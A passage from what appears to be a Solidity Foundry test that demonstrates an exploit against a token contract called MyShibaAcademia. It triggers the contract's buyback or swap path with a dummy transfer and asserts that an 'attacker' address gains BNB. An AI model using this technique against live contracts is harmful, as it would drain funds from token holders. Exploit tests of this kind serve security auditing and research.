        // and from != uniswapV2Pair
        // We need to make a transfer that's not from/to the pair
        address dummy = address(0x123);

        // Record attacker balance before
        uint256 attackerBalanceBefore = address(attacker).balance;

        // Make a transfer to trigger the check
        // This should trigger buyback since contract has 1 ETH > buyBackUpperLimit (if set correctly)
        MyShibaAcademia(TARGET).transfer(dummy, 1 * 10**9);

        // Step 6: Check if attacker received BNB
        uint256 attackerBalanceAfter = address(attacker).balance;

        // The marketing address should receive BNB from swapTokens function
        // Or from buyback mechanism
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should have received BNB");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

